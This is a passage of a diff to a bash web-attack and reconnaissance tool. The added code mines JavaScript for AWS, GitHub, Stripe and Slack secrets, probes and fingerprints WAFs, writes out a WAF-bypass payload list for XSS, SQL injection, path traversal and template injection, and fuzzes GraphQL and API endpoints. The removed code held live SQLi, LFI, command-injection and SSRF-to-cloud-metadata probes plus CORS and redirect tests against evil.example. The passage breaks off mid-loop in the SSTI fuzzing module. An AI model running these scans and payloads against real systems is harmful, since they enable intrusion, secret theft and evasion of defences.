+        | grep -iE '(api|v[0-9]|user|admin|auth|account|order|payment|upload|export|import|download|config|graphql|webhook|oauth|token|session|file|image|document|report|search|query|notification|message|product|cart|checkout|invoice|billing|profile|member|role|permission|invite|team|org|project|task|setting|preference)' \
+        | sort -u > "$O/js_api_routes.txt"
+    log_ok "API routes: $(cnt "$O/js_api_routes.txt")"
+
+    # ── 5. Secret mining — deduped, real-entropy only ──
+    log_info "Secret mining..."
+    if [[ -s "$JS_TMP" ]]; then
+        echo "AKIA keys:     $(grep -oE 'AKIA[0-9A-Z]{16}' "$JS_TMP" | sort -u | tee "$O/aws_keys.txt" | wc -l)"
+        echo "GCP keys:      $(grep -oE 'AIza[0-9A-Za-z_-]{35}' "$JS_TMP" | sort -u | tee "$O/gcp_keys.txt" | wc -l)"
+        echo "Stripe keys:   $(grep -oE 'sk-(live|test)-[a-zA-Z0-9]{20,}' "$JS_TMP" | sort -u | tee "$O/stripe_keys.txt" | wc -l)"
+        echo "GitHub tokens: $(grep -oE 'ghp_[a-zA-Z0-9]{36}' "$JS_TMP" | sort -u | tee "$O/github_tokens.txt" | wc -l)"
+        echo "Slack tokens:  $(grep -oE 'xox[baprs]-[a-zA-Z0-9-]{10,}' "$JS_TMP" | sort -u | tee "$O/slack_tokens.txt" | wc -l)"
+        echo "JWTs:          $(grep -oE 'eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*' "$JS_TMP" | sort -u | tee "$O/jwt_tokens.txt" | wc -l)"
+        grep -oiE "(api[_-]?key|apikey|secret|client[_-]?secret|access[_-]?token|auth[_-]?token|private[_-]?key|password|passwd|pwd|bearer)[\"' ]*[:=][\"' ][a-zA-Z0-9._/+=-]{12,}[\"']" "$JS_TMP" \
+            | grep -viE '(your|example|xxxx|test_|placeholder|changeme|undefined|null|true|false|000000|api_key_here)' \
+            | sort -u > "$O/potential_secrets.txt"
+        grep -oiE '(innerHTML|outerHTML|document\.write|\.html\(|eval\(|setTimeout\(|setInterval\()' "$JS_TMP" | sort -u > "$O/dom_xss_sinks.txt"
+        grep -oE '[a-zA-Z0-9_-]+\.s3[\.-][a-zA-Z0-9.-]*\.amazonaws\.com' "$JS_TMP" | sort -u > "$O/s3_in_js.txt"
+        grep -oiE "(baseURL|apiBase|API_URL|api_url|endpoint)[\"' ]*[:=][\"' ][a-zA-Z0-9./:_-]{5,}[\"']" "$JS_TMP" | sort -u > "$O/api_base_urls.txt"
+
+        cat "$O/aws_keys.txt" "$O/gcp_keys.txt" "$O/stripe_keys.txt" \
+            "$O/github_tokens.txt" "$O/slack_tokens.txt" \
+            "$O/potential_secrets.txt" 2>/dev/null \
+            | grep -vE '^$' | sort -u > "$O/secrets_found.txt"
+        [[ -s "$O/secrets_found.txt" ]] && \
+            log_hit "SECRETS IN JS: $(cnt "$O/secrets_found.txt") unique lines"
+    else
+        for f in aws_keys gcp_keys stripe_keys github_tokens slack_tokens \
+                 potential_secrets jwt_tokens dom_xss_sinks s3_in_js \
+                 api_base_urls secrets_found; do
+            touch "$O/${f}.txt"
+        done
+    fi
+
+    # ── 6. LinkFinder on downloaded files only (no HTTP, fast) ──
+    if [[ -f "$HOME/tools/LinkFinder/linkfinder.py" ]]; then
+        find "$O/downloaded" -name "*.js" -type f 2>/dev/null | head -200 | while IFS= read -r jsfile; do
+            python3 "$HOME/tools/LinkFinder/linkfinder.py" -i "$jsfile" -o cli 2>/dev/null || true
+        done | sort -u > "$O/linkfinder_endpoints.txt" || true
+    else
+        touch "$O/linkfinder_endpoints.txt"
+    fi
+
+    # ── 7. Merge + dedup into master endpoint lists ──
+    cat "$O/js_endpoints_raw.txt" "$O/linkfinder_endpoints.txt" 2>/dev/null \
+        | sort -u > "$O/all_js_endpoints.txt"
+    log_ok "JS endpoints total: $(cnt "$O/all_js_endpoints.txt")"
+
+    cat "$O/js_api_routes.txt" "$O/all_js_endpoints.txt" 2>/dev/null \
+        | sort -u >> "$WORKSPACE/endpoints/all_endpoints.txt"
+    sort -u -o "$WORKSPACE/endpoints/all_endpoints.txt" \
+        "$WORKSPACE/endpoints/all_endpoints.txt" 2>/dev/null || true
+    log_ok "mod_js complete → $O/"
+}
+
+# ══════════════════════════════════════════════════════
+# MODULE WAF — WAF FINGERPRINTING & BYPASS PROFILING
+# ══════════════════════════════════════════════════════
+mod_waf() {
+    progress "MODULE WAF — WAF Fingerprinting & Bypass Profiling"
+    log_section "MODULE WAF — WAF FINGERPRINTING"
+    local O="$WORKSPACE/waf"
+    mkdir -p "$O"
+    local LIVE="$WORKSPACE/subdomains/live_urls.txt"
+
+    # ── wafw00f detection ─────────────────────────────
+    if has wafw00f; then
+        log_info "wafw00f passive+active detection..."
+        while IFS= read -r url; do
+            wafw00f "$url" -a -o "$O/wafw00f_$(safe_name "$url").json" --format=json 2>/dev/null || true
+        done < <(head -10 "$LIVE" 2>/dev/null)
+        find "$O" -name "wafw00f_*.json" -exec jq -r '.detected[]? | "\(.waf) | \(.url)"' {} 2>/dev/null \; \
+            | sort -u > "$O/waf_detected.txt" || true
+        if [[ -s "$O/waf_detected.txt" ]]; then
+            log_warn "WAFs detected:"
+            cat "$O/waf_detected.txt" | while IFS= read -r line; do log_warn "  $line"; done
+        else
+            log_ok "No WAF detected by wafw00f (or unrecognised)"
         fi
-      done
-    done
-  fi
-  local JP=('{"__proto__":{"admin":true}}' '{"$gt":"","$ne":""}' '{"role":"admin","is_admin":true,"privilege":9999}')
-  local JL=("prototype_pollution" "nosql_injection" "mass_assignment")
-  if [[ -s "$W/urls/params.txt" ]]; then
-    head -15 "$W/urls/params.txt" | while IFS= read -r u; do
-      for i in "${!JP[@]}"; do
-        local b c; b=$(curlx -X POST -H "Content-Type: application/json" -d "${JP[$i]}" -- "$u" 2>/dev/null | head -c 1200 || true)
-        c=$(curlx -X POST -H "Content-Type: application/json" -d "${JP[$i]}" -o /dev/null -w '%{http_code}' -- "$u" 2>/dev/null || echo 000)
-        if [[ "$c" =~ ^(200|201)$ ]] || echo "$b" | grep -qiE "(admin|success|token|privilege|elevated)"; then
-          echo "MEDIUM|JSON_MUTATION|${JL[$i]} [${c}] $u" >> "$O/json_hits.txt"
-          log H "JSON mutation (verified): ${JL[$i]} @ $u"
+    else
+        log_warn "wafw00f not installed — skipping passive detection (header probes still run)"
+    fi
+
+    # ── Header mutation probes ────────────────────────
+    log_info "Header mutation fingerprinting..."
+    local MAIN; MAIN=$(head -1 "$LIVE" 2>/dev/null)
+    [[ -z "$MAIN" ]] && MAIN="https://$DOMAIN"
+
+    declare -A WAF_SIGS=(
+        ["Cloudflare"]="cf-ray|cloudflare"
+        ["Akamai"]="akamai|x-akamai"
+        ["AWS WAF"]="x-amzn-requestid|x-amz-cf-id"
+        ["Imperva/Incapsula"]="x-iinfo|incap_ses|visid_incap"
+        ["F5 BIG-IP"]="x-wa-info|ts=[0-9a-f]"
+        ["Sucuri"]="x-sucuri-id|sucuri"
+        ["Fastly"]="x-fastly|fastly"
+        ["ModSecurity"]="mod_security|modsec"
+    )
+
+    local hdrs; hdrs=$(_curl -I "$MAIN" 2>/dev/null | tr '[:upper:]' '[:lower:]')
+    for waf in "${!WAF_SIGS[@]}"; do
+        local sig="${WAF_SIGS[$waf]}"
+        if echo "$hdrs" | grep -qiE "$sig"; then
+            echo "HEADER_MATCH: $waf" >> "$O/waf_header_match.txt"
+            log_warn "WAF header match: $waf"
         fi
-      done
     done
-  fi
-  u "$O/hidden_params.txt" "$O/type_confusion.txt" "$O/json_hits.txt"
-  log OK "hidden params: $(cnt "$O/hidden_params.txt") | type confusion: $(cnt "$O/type_confusion.txt") | json: $(cnt "$O/json_hits.txt")"
-}
+    sort -u -o "$O/waf_header_match.txt" "$O/waf_header_match.txt" 2>/dev/null || true
 
-# ─────────────────────────── STAGE: CALIBRATE / SOFT404 ───────────────────────────
-CAL_A=""; CAL_B=""
-calibrate() {
-  local base=$1
-  local ra rb
-  probe "${base}/__nemesis_cal_$(date +%s%N)_a"; ra="$RB"
-  probe "${base}/__nemesis_cal_$(date +%s%N)_b"; rb="$RB"
-  CAL_A=$(sn "$ra"); CAL_B=$(sn "$rb")
-  [[ -n "$CAL_A" && "$CAL_A" == "$CAL_B" ]] && CAL_B="same-as-a"
-}
-soft404() {
-  local u=$1 body=$2
-  [[ "$CAL_A" == "same-as-a" ]] && return 0
-  local s; s=$(sn "$body")
-  [[ "$s" == "$CAL_A" || "$s" == "$CAL_B" ]] && return 0
-  return 1
-}
-stage_calibrate() {
-  step "CALIBRATE — soft-404 baseline per host"
-  while IFS= read -r base; do calibrate "$base"; done < <(head -4 "$W/subs/live.txt" 2>/dev/null)
-  log OK "baseline: ${CAL_A:-n/a}"
-}
+    # ── Payload probe — how does it block? ───────────
+    log_info "WAF behavior probes (block/pass/transform)..."
+    local -a PROBES=(
+        "/?__test__=<script>alert(1)</script>"
+        "/?__test__=' OR 1=1--"
+        "/?__test__=../../../etc/passwd"
+        "/?__test__=; cat /etc/passwd"
+        "/?__test__={{7*7}}"
+        "/?__test__=|whoami"
+    )
+    local -a LABELS=("XSS" "SQLi" "LFI" "CMDi" "SSTI" "CMDi2")
+    for i in "${!PROBES[@]}"; do
+        local probe="${PROBES[$i]}"
+        local label="${LABELS[$i]}"
+        local resp_code; resp_code=$(_curl -o /dev/null -w "%{http_code}" "${MAIN}${probe}" 2>/dev/null || echo "000")
+        local resp_body; resp_body=$(_curl -s "${MAIN}${probe}" 2>/dev/null | head -c 2000 || true)
+        local result="PASS[$resp_code]"
+        echo "$resp_body" | grep -qiE "(blocked|forbidden|access denied|request denied|detected|firewall|illegal|malicious|attack)" \
+            && result="BLOCKED[$resp_code]"
+        [[ "$resp_code" == "403" || "$resp_code" == "406" || "$resp_code" == "429" || "$resp_code" == "503" ]] \
+            && result="BLOCKED[$resp_code]"
+        echo "[$label] $result  ${MAIN}${probe}" >> "$O/waf_probe_results.txt"
+    done
+    sort -u -o "$O/waf_probe_results.txt" "$O/waf_probe_results.txt" 2>/dev/null || true
+    log_ok "WAF probe results → $O/waf_probe_results.txt"
 
-# ─────────────────────────── AUTHZ MODULES (VERIFY → QUEUE) ───────────────────────────
-mod_csrf_cors_redirect() {
-  step "AUTHZ — CSRF · CORS · open redirect (all verified)"
-  local O="$W/vulns/authz"; mkdir -p "$O"
-  # CSRF: POST endpoints without token check
-  if [[ -s "$W/urls/params.txt" ]]; then
-    grep -E '\.(php|asp|aspx|jsp)([?#]|$)' "$W/urls/params.txt" | head -20 | while IFS= read -r u; do
-      local hdr; hdr=$(curlx -X POST -H "Origin: https://evil.example" -D - -o /dev/null -- "$u" 2>/dev/null || true)
-      echo "$hdr" | grep -qiE "set-cookie:.*(csrf|xsrf|token)" && continue
-      local c; c=$(curlx -X POST -d "x=1" -o /dev/null -w '%{http_code}' -- "$u" 2>/dev/null || echo 000)
-      [[ "$c" =~ ^(200|201|204|302)$ ]] && { echo "MEDIUM|CSRF-NO-TOKEN|${c} $u" >> "$O/csrf.txt"; qadd medium csrf "$u"; }
-    done
-  fi
-  # CORS: reflected origin + credentials
-  if [[ -s "$W/urls/params.txt" ]]; then
-    head -20 "$W/urls/params.txt" | while IFS= read -r u; do
-      local hd; hd=$(curlx -H "Origin: https://evil.example" -D - -o /dev/null -- "$u" 2>/dev/null || true)
-      if echo "$hd" | grep -qi "Access-Control-Allow-Origin: https://evil.example"; then
-        local cr; cr=$(echo "$hd" | grep -i "Access-Control-Allow-Credentials" | grep -qi true && echo yes || echo no)
-        local sev=medium; [[ "$cr" == "yes" ]] && sev=high
-        echo "${sev^^}|CORS-REFLECT|credentials:${cr} $u" >> "$O/cors.txt"
-        qadd "$sev" cors "$u"
-      fi
-    done
-  fi
-  # Open redirect
-  if [[ -s "$W/urls/params.txt" ]]; then
-    head -20 "$W/urls/params.txt" | while IFS= read -r u; do
-      local t loc; t=$(echo "$u" | qsreplace "https://evil.example" 2>/dev/null)
-      loc=$(curlx -s -o /dev/null -w '%{redirect_url}' -- "$t" 2>/dev/null || true)
-      [[ "$loc" == https://evil.example* ]] && { echo "HIGH|OPEN-REDIRECT|$t → $loc" >> "$O/redirect.txt"; qadd high redirect "$t"; }
-    done
-  fi
-  u "$O/csrf.txt" "$O/cors.txt" "$O/redirect.txt"
-  log OK "csrf: $(cnt "$O/csrf.txt") | cors: $(cnt "$O/cors.txt") | redirect: $(cnt "$O/redirect.txt")"
-}
-
-mod_sqli_verify() {
-  step "SQLI — auto-detect → verify → queue"
-  local O="$W/vulns/web"; mkdir -p "$O"
-  [[ -s "$W/urls/params.txt" ]] || { log I "no param URLs — skip"; return; }
-  head -80 "$W/urls/params.txt" | while IFS= read -r u; do
-    local t; t=$(echo "$u" | qsreplace "'" 2>/dev/null)
-    probe "$t"
-    if [[ "$RC" == "500" ]] || echo "$RB" | grep -qiE "sql (syntax|error)|unclosed quotation|mysql_|postgres|sqlite|ora-[0-9]+|odbc"; then
-      # verify: boolean true vs false
-      local bt bf
-      bt=$(curlx -- "$(echo "$u" | qsreplace "' AND '1'='1" 2>/dev/null)" 2>/dev/null | head -c 4000 || true)
-      bf=$(curlx -- "$(echo "$u" | qsreplace "' AND '1'='2" 2>/dev/null)" 2>/dev/null | head -c 4000 || true)
-      local tb; tb=$(sn "$bt"); local fb; fb=$(sn "$bf")
-      local rb1; rb1=$(echo "$bt" | head -c 2000 | md5sum | cut -c1-12)
-      local rb2; rb2=$(echo "$bf" | head -c 2000 | md5sum | cut -c1-12)
-      if [[ "$rb1" != "$rb2" ]]; then
-        echo "CRITICAL|SQLI-BOOLEAN-VERIFIED|$t" >> "$O/sqli_verified.txt"
-        qadd critical sqli "$t"
-        log H "SQLi VERIFIED (boolean): $t"
-      else
-        # time-based check
-        local t0 t1 ms; t0=$(date +%s%N)
-        curlx -o /dev/null -- "$(echo "$u" | qsreplace "IF(1=1,SLEEP(3),0)" 2>/dev/null)" 2>/dev/null || true
-        t1=$(date +%s%N); ms=$(( (t1-t0)/1000000 ))
-        [[ "$ms" -gt 2500 ]] && { echo "CRITICAL|SQLI-TIME-VERIFIED|${ms}ms $t" >> "$O/sqli_verified.txt"; qadd critical sqli "$t"; log H "SQLi VERIFIED (time ${ms}ms): $t"; }
-      fi
+    # ── Bypass mutations if WAF detected ─────────────
+    if [[ -s "$O/waf_detected.txt" || -s "$O/waf_header_match.txt" ]]; then
+        log_info "Generating WAF bypass mutation set..."
+        cat > "$O/waf_bypass_payloads.txt" << 'WAFBYPASS'
+# XSS bypasses
+<ScRiPt>alert(1)</sCrIpT>
+<img src=x oNeRrOr=alert(1)>
+<svg/onload=alert(1)>
+%3Cscript%3Ealert(1)%3C/script%3E
+<script>alert(1)</script>
+<a href="javas&#99;ript:alert(1)">
+# SQLi bypasses
+'/**/OR/**/1=1--
+'%09OR%091=1--
+' /*!OR*/ 1=1--
+'||'1'='1
+1'||'1'='1'||'1'='1
+' OR 1=1 LIMIT 1 OFFSET 1--
+# LFI bypasses
+....//....//etc/passwd
+..%252f..%252fetc/passwd
+%2e%2e%2fetc%2fpasswd
+php://filter/read=convert.base64-encode/resource=index.php
+# SSTI bypasses
+{{7*'7'}}
+'${7*7}'
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+WAFBYPASS
+        log_ok "WAF bypass payloads written → $O/waf_bypass_payloads.txt"
     fi
-  done
-  u "$O/sqli_verified.txt"
-  log OK "SQLi verified: $(cnt "$O/sqli_verified.txt")"
+
+    # ── Rate-limit threshold probe ────────────────────
+    log_info "Rate-limit threshold probe (20 rapid requests)..."
+    local block_count=0
+    for i in $(seq 1 20); do
+        local c; c=$(_curl -o /dev/null -w "%{http_code}" "$MAIN" 2>/dev/null || echo "000")
+        [[ "$c" == "429" || "$c" == "503" ]] && ((block_count++))
+    done
+    echo "rate_limit_blocks_in_20_req=$block_count" >> "$O/waf_probe_results.txt"
+    [[ $block_count -gt 0 ]] && log_warn "Rate limiting detected: $block_count/20 requests blocked" \
+        || log_ok "No rate limiting on 20 rapid requests"
+
+    log_ok "WAF fingerprinting complete → $O/"
 }
 
-mod_lfi_ssrf_cmdi_ssti() {
-  step "LFI · SSRF · CMDi · SSTI — detect → verify → queue"
-  local O="$W/vulns/web"; mkdir -p "$O"
-  [[ -s "$W/urls/params.txt" ]] || { log I "no param URLs — skip"; return; }
-  local LFI_P=("../../../../etc/passwd" "....//....//etc/passwd" "%2e%2e%2f%2e%2e%2fetc%2fpasswd" "..%2f..%2f..%2f..%2fetc%2fpasswd")
-  local SSRF_P=("http://169.254.169.254/latest/meta-data/" "http://127.0.0.1:80/" "http://localhost/" "http://[::1]/" "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
-  local CMD_P=(";id" "|id" "`id`" "$(id)" "&&id" "|whoami")
-  local SSTI_P=('{{7*7}}' '${7*7}' '<%= 7*7 %>' '{{7*'7'}}' '#{7*7}')
-  local FILE_SIG="root:x:0:0:"
-  local DELAY=3
-  head -40 "$W/urls/params.txt" | while IFS= read -r u; do
-    # LFI
-    for p in "${LFI_P[@]}"; do
-      local t b; t=$(echo "$u" | qsreplace "$p" 2>/dev/null)
-      b=$(curlx -- "$t" 2>/dev/null | head -c 3000 || true)
-      if echo "$b" | grep -q "$FILE_SIG"; then
-        echo "CRITICAL|LFI-VERIFIED|$t" >> "$O/lfi_verified.txt"
-        qadd critical lfi "$t"
-        log H "LFI VERIFIED: $t"
-        break
-      fi
+# ══════════════════════════════════════════════════════
+# MODULE API — API SCHEMA DISCOVERY
+# ══════════════════════════════════════════════════════
+mod_api_schema() {
+    progress "MODULE API — API Schema Discovery"
+    log_section "MODULE API — API SCHEMA DISCOVERY (OpenAPI/GraphQL)"
+    local O="$WORKSPACE/api_schema"
+    mkdir -p "$O"/{openapi,graphql,undocumented}
+    local LIVE="$WORKSPACE/subdomains/live_urls.txt"
+
+    # ── OpenAPI / Swagger discovery ───────────────────
+    log_info "OpenAPI/Swagger spec hunting..."
+    local -a API_PATHS=(
+        "/swagger.json" "/swagger.yaml" "/swagger/v1/swagger.json"
+        "/swagger-ui.html" "/swagger-ui/" "/swagger-ui/index.html"
+        "/api-docs" "/api-docs.json" "/api/swagger.json"
+        "/api/v1/swagger.json" "/api/v2/swagger.json" "/api/v3/swagger.json"
+        "/openapi.json" "/openapi.yaml" "/openapi/v1" "/openapi/v2"
+        "/v1/api-docs" "/v2/api-docs" "/v3/api-docs"
+        "/api/openapi.json" "/api/openapi.yaml"
+        "/redoc" "/redoc.html" "/.well-known/openapi"
+        "/api/schema/" "/schema/swagger.json"
+        "/api/swagger-ui.html"
+    )
+
+    while IFS= read -r base; do
+        for path in "${API_PATHS[@]}"; do
+            local url="${base}${path}"
+            local code; code=$(_curl -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo "000")
+            if [[ "$code" == "200" ]]; then
+                local body; body=$(_curl "$url" 2>/dev/null || true)
+                if echo "$body" | grep -qiE "(swagger|openapi|paths|info|endpoints)"; then
+                    echo "$url" >> "$O/openapi/specs_found.txt"
+                    local fname="$O/openapi/$(safe_name "$url").json"
+                    echo "$body" > "$fname"
+                    log_hit "API SPEC FOUND: $url"
+                    echo "$body" | jq -r '.paths | keys[]?' 2>/dev/null \
+                        >> "$O/openapi/spec_endpoints.txt" || true
+                fi
+            fi
+        done
+    done < <(head -15 "$LIVE" 2>/dev/null)
+    touch "$O/openapi/spec_endpoints.txt" "$O/openapi/specs_found.txt" 2>/dev/null || true
+    sort -u -o "$O/openapi/spec_endpoints.txt" "$O/openapi/spec_endpoints.txt" 2>/dev/null || true
+    sort -u -o "$O/openapi/specs_found.txt" "$O/openapi/specs_found.txt" 2>/dev/null || true
+    log_ok "OpenAPI specs: $(cnt "$O/openapi/specs_found.txt") | Endpoints in specs: $(cnt "$O/openapi/spec_endpoints.txt")"
+
+    # ── GraphQL introspection ─────────────────────────
+    log_info "GraphQL endpoint detection + introspection..."
+    local -a GQL_PATHS=("/graphql" "/api/graphql" "/graphql/v1" "/v1/graphql"
+                        "/graphiql" "/graphql-explorer" "/gql" "/query" "/api/query")
+
+    while IFS= read -r base; do
+        for path in "${GQL_PATHS[@]}"; do
+            local url="${base}${path}"
+            local resp; resp=$(_curl -X POST -H "Content-Type: application/json" \
+                -d '{"query":"{ __typename }"}' "$url" 2>/dev/null || true)
+            if echo "$resp" | grep -qiE "(data|__typename|errors)" && echo "$resp" | grep -q "{"; then
+                echo "GQL_ENDPOINT: $url" >> "$O/graphql/endpoints.txt"
+                log_hit "GraphQL endpoint: $url"
+
+                local INTROSPECTION_Q='{"query":"{ __schema { queryType { name } types { name kind fields { name args { name type { name kind } } } } } }"}'
+                local schema; schema=$(_curl -X POST -H "Content-Type: application/json" \
+                    -d "$INTROSPECTION_Q" "$url" 2>/dev/null || true)
+                if echo "$schema" | grep -qiE "__schema|queryType"; then
+                    echo "$schema" > "$O/graphql/schema_$(safe_name "$url").json"
+                    log_hit "GraphQL introspection enabled: $url"
+                    echo "INTROSPECTION_OPEN: $url" >> "$O/graphql/introspection_open.txt"
+                    echo "$schema" | jq -r '.data.__schema.types[]?.name' 2>/dev/null \
+                        | grep -v "^__" | sort -u >> "$O/graphql/type_names.txt" || true
+                else
+                    echo "INTROSPECTION_DISABLED: $url" >> "$O/graphql/introspection_disabled.txt"
+                fi
+
+                local batch_resp; batch_resp=$(_curl -X POST -H "Content-Type: application/json" \
+                    -d '[{"query":"{ __typename }"},{"query":"{ __typename }"}]' "$url" 2>/dev/null || true)
+                echo "$batch_resp" | grep -qiE "(data|__typename)" \
+                    && echo "BATCH_ENABLED: $url" >> "$O/graphql/batch_enabled.txt" \
+                    && log_warn "GraphQL batching enabled (DoS / rate-limit bypass): $url"
+
+                local depth_q='{"query":"{ a: __typename b: __typename c: __typename d: __typename e: __typename f: __typename g: __typename h: __typename i: __typename j: __typename }"}'
+                _curl -X POST -H "Content-Type: application/json" -d "$depth_q" "$url" 2>/dev/null \
+                    | grep -qiE "(error|limit|exceeded)" \
+                    || echo "NO_DEPTH_LIMIT: $url" >> "$O/graphql/no_depth_limit.txt" || true
+            fi
+        done
+    done < <(head -15 "$LIVE" 2>/dev/null)
+    sort -u -o "$O/graphql/endpoints.txt" "$O/graphql/endpoints.txt" 2>/dev/null || true
+    sort -u -o "$O/graphql/introspection_open.txt" "$O/graphql/introspection_open.txt" 2>/dev/null || true
+    sort -u -o "$O/graphql/introspection_disabled.txt" "$O/graphql/introspection_disabled.txt" 2>/dev/null || true
+    sort -u -o "$O/graphql/batch_enabled.txt" "$O/graphql/batch_enabled.txt" 2>/dev/null || true
+    sort -u -o "$O/graphql/no_depth_limit.txt" "$O/graphql/no_depth_limit.txt" 2>/dev/null || true
+    log_ok "GraphQL endpoints: $(cnt "$O/graphql/endpoints.txt") | Introspection open: $(cnt "$O/graphql/introspection_open.txt")"
+
+    # ── Undocumented endpoint fuzzing ─────────────────
+    log_info "API version + undocumented path fuzzing..."
+    local MAIN="https://$DOMAIN"
+    local -a API_VERSIONS=("v1" "v2" "v3" "v4" "v5" "v1.0" "v2.0" "latest" "beta" "alpha" "dev" "internal" "private")
+    local -a API_BASES=("/api" "/api/rest" "/rest" "/service" "/services" "/backend")
+    local -a API_RESOURCES=("users" "user" "accounts" "account" "orders" "order" "products" "product"
+                             "admin" "config" "settings" "payments" "invoices" "customers" "members"
+                             "reports" "export" "import" "upload" "auth" "tokens" "keys" "webhooks"
+                             "roles" "permissions" "groups" "events" "logs" "audit" "metrics")
+
+    for base in "${API_BASES[@]}"; do
+        for ver in "${API_VERSIONS[@]}"; do
+            local c; c=$(_curl -o /dev/null -w "%{http_code}" "${MAIN}${base}/${ver}" 2>/dev/null || echo "000")
+            if [[ "$c" =~ ^(200|201|401|403)$ ]]; then
+                echo "API_BASE_FOUND [${c}]: ${MAIN}${base}/${ver}" >> "$O/undocumented/api_bases.txt"
+                for res in "${API_RESOURCES[@]}"; do
+                    local rc; rc=$(_curl -o /dev/null -w "%{http_code}" "${MAIN}${base}/${ver}/${res}" 2>/dev/null || echo "000")
+                    [[ "$rc" =~ ^(200|201|401|403)$ ]] && \
+                        echo "API_RESOURCE [${rc}]: ${MAIN}${base}/${ver}/${res}" >> "$O/undocumented/api_resources.txt"
+                done
+            fi
+        done
     done
-    # SSRF (meta + probe via unique marker)
-    for p in "${SSRF_P[@]}"; do
-      local t2 b2; t2=$(echo "$u" | qsreplace "$p" 2>/dev/null)
-      b2=$(curlx -L -- "$t2" 2>/dev/null | head -c 3000 || true)
-      if echo "$b2" | grep -qiE "(ami-id|instance-id|security-credentials|meta-data|computeMetadata)"; then
-        echo "CRITICAL|SSRF-METADATA-VERIFIED|$t2" >> "$O/ssrf_verified.txt"
-        qadd critical ssrf "$t2"
-        log H "SSRF → cloud metadata VERIFIED: $t2"
-        break
-      fi
-    done
-    # CMDi
-    for p in "${CMD_P[@]}"; do
-      local t3 b3; t3=$(echo "$u" | qsreplace "$p" 2>/dev/null)
-      b3=$(curlx -- "$t3" 2>/dev/null | head -c 2000 || true)
-      if echo "$b3" | grep -qE "uid=[0-9]+\(|root:x:0:0:|GNU coreutils"; then
-        echo "CRITICAL|CMDi-VERIFIED|$t3" >> "$O/cmdi_verified.txt"
-        qadd critical cmdi "$t3"
-        log H "CMDi VERIFIED: $t3"
-        break
-      fi
-    done
-    # SSTI
-    for p in "${SSTI_P[@]}"; do
-      local t4 b4; t4=$(echo "$u" | qsreplace "$p" 2>/dev/null)
-      b4=$(curlx -- "$t4" 2>/dev/null || true)
-      if echo "$b4" | grep -q "49"; then
-        local eng="Jinja2"; echo "$b4" | grep -q "{{" && eng="Jinja2/Twig"
-        echo "CRITICAL|SSTI-VERIFIED|${eng}|$t4" >> "$O/ssti_verified.txt"
-        qadd critical ssti "${eng}|$t4"
-        log H "SSTI VERIFIED ($eng): $t4"
-        break
-      fi
-    done
-  done
-  u "$O/lfi_verified.txt" "$O/ssrf_verified.txt" "$O/cmdi_verified.txt" "$O/ssti_verified.txt"
-  log OK "LFI: $(cnt "$O/lfi_verified.txt") | SSRF: $(cnt "$O/ssrf_verified.txt") | CMDi: $(cnt "$O/cmdi_verified.txt") | SSTI: $(cnt "$O/ssti_verified.txt")"
+    sort -u -o "$O/undocumented/api_bases.txt" "$O/undocumented/api_bases.txt" 2>/dev/null || true
+    sort -u -o "$O/undocumented/api_resources.txt" "$O/undocumented/api_resources.txt" 2>/dev/null || true
+    log_ok "Undocumented API bases: $(cnt "$O/undocumented/api_bases.txt")"
+    log_ok "Undocumented API resources: $(cnt "$O/undocumented/api_resources.txt")"
+
+    # ── Feed interesting paths ────────────────────────
+    cat "$O/openapi/spec_endpoints.txt" "$O/graphql/endpoints.txt" \
+        "$O/undocumented/api_resources.txt" 2>/dev/null \
+        >> "$WORKSPACE/endpoints/interesting_paths.txt" || true
+    sort -u -o "$WORKSPACE/endpoints/interesting_paths.txt" \
+        "$WORKSPACE/endpoints/interesting_paths.txt" 2>/dev/null || true
+
+    log_ok "API schema discovery complete → $O/"
 }
 
-mod_idor_bac() {
-  step "IDOR · BAC — param heuristics → verified"
-  local O="$W/vulns/web"; mkdir -p "$O"
-  [[ -s "$W/urls/params.txt" ]] || { log I "no param URLs — skip"; return; }
-  grep -E '[?&](id|uid|user_id|account|acct|profile|file_id|doc_id|order|order_id|invoice|ref|code)=[0-9]+' "$W/urls/params.txt" | head -15 | while IFS= read -r u; do
-    local id; id=$(echo "$u" | grep -oE '(id|uid|user_id|account|acct|profile|file_id|doc_id|order|order_id|invoice|ref|code)=[0-9]+' | head -1)
-    local pn pv; pn="${id%%=*}"; pv="${id#*=}"
-    local t; t=$(echo "$u" | sed "s/${pn}=${pv}/${pn}=$((pv+1))/")
-    local b1 b2; b1=$(curlx -- "$u" 2>/dev/null | head -c 2000 || true); b2=$(curlx -- "$t" 2>/dev/null | head -c 2000 || true)
-    if [[ "$(echo "$b1" | md5sum | cut -c1-12)" != "$(echo "$b2" | md5sum | cut -c1-12)" ]]; then
-      if echo "$b2" | grep -qiE "email|password|token|address|phone|ssn|invoice"; then
-        echo "HIGH|IDOR-CANDIDATE|$u vs $t" >> "$O/idor.txt"
-        qadd high idor "$u"
-        log H "IDOR candidate (2-account verify needed): $t"
-      fi
+# ══════════════════════════════════════════════════════
+# MODULE PMF — PARAMETER MUTATION FUZZING
+# ══════════════════════════════════════════════════════
+mod_param_fuzz() {
+    [[ "$F_NO_EXPLOIT" == true ]] && return
+    progress "MODULE PMF — Parameter Mutation Fuzzing"
+    log_section "MODULE PMF — PARAMETER MUTATION FUZZING (SSTI/Type Confusion/Hidden Params)"
+    local O="$WORKSPACE/vulns/param_fuzz"
+    mkdir -p "$O"/{ssti,type_confusion,hidden_params,json_xml}
+    touch "$O/ssti/ssti_confirmed.txt" "$O/ssti/ssti_error.txt" "$O/type_confusion/findings.txt" "$O/json_xml/json_hits.txt" "$O/json_xml/json_500.txt" "$O/hidden_params/discovered_params.txt" 2>/dev/null || true
+    local PARAMS_IN="$WORKSPACE/urls/urls_with_params.txt"
+
+    # ── SSTI detection ────────────────────────────────
+    log_info "SSTI detection (Jinja2/Twig/Freemarker/Pebble/Velocity/ERB)..."
+    local -a SSTI_PAYLOADS=(
+        "{{7*7}}" "{{7*'7'}}" '${7*7}' "<%= 7*7 %>" "#{7*7}" "*{7*7}"
+        '{{config}}' '{{self}}' '{{<%SSTI%>}}'
+        "{{'7'*7}}" "{{range.new(0,7)}}" "{{1+1}}"
+        "{%print(7*7)%}" "{% debug %}" "{{dump(app)}}"
+        '#{class.forName("java.lang.Runtime")}'
+        "#{7*7}" "T(java.lang.Runtime).getRuntime().exec('id')"
+    )
+
+    while IFS= read -r url; do
+        for payload in "${SSTI_PAYLOADS[@]}"; do
